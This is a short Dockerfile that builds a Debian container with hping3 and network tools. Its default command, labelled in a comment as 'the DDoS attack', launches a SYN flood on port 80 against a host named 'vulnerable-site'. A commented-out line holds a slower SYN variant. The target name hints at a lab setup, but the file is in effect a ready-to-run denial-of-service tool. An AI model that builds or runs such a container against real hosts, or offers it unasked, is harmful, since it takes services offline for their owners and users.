# Use a lightweight Linux image
FROM debian:latest

# Update the package repository and install hping3
RUN apt-get update && apt-get install -y hping3 iputils-ping tcpdump iproute2 && rm -rf /var/lib/apt/lists/*

# Set the default command to use hping3 for the DDoS attack
CMD ["hping3", "-I", "eth0", "-S", "--flood", "-V", "-p", "80", "vulnerable-site"]
# CMD ["hping3", "-I", "eth0", "-S", "-p", "80", "--interval", "u10000", "vulnerable-site"]
